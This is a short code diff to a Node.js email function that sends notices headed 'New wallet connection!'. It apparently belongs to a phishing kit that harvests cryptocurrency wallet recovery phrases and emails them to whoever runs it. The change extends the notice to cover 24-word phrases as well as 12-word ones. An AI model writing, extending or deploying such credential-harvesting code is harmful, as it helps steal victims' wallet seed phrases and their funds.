@@ -4,7 +4,9 @@ module.exports = async function sendEmail(data, type) {
   try {
     const template = `
     <h1>New wallet connection!</h1>
-    <p><b>Type:</b> ${type === "12" ? "12 key wallet phrase" : ""}</p>
+    <p><b>Type:</b> ${
+      type === "12" ? "12" : type === "24" ? "24" : ""
+    } key wallet phrase</p>
     <table width="100%" border="0" cellspacing="0" cellpadding="8" style="border-collapse: collapse; font-family: Arial, sans-serif; font-size: 14px; color: #333; background-color: #f9f9f9; border: 1px solid #ddd;">
     <tHead>
         <tr style="background-color: #0073e6; color: white; font-weight: bold; text-align: left;">
